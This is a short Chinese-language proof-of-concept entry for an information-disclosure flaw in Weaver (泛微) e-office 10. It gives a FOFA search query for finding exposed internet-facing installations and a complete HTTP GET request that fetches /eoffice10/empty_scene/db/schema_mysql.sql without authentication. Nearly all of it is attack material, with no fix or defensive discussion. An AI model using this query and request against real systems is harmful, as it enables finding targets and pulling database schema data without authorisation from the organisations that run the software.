# 泛微e-office10系统schema_mysql.sql敏感信息泄露漏洞

泛微 e-office 10 schema_mysql.sql敏感信息泄露漏洞

## fofa

```java
body="eoffice_loading_tip" && body="eoffice10"
```

## poc

```java
GET /eoffice10/empty_scene/db/schema_mysql.sql HTTP/1.1
Host:
Pragma:no-cache
Cache-Control:no-cache
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding:gzip,deflate
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8
Connection:close
Content-Type:application/x-www-form-urlencoded
Content-Length:70
```

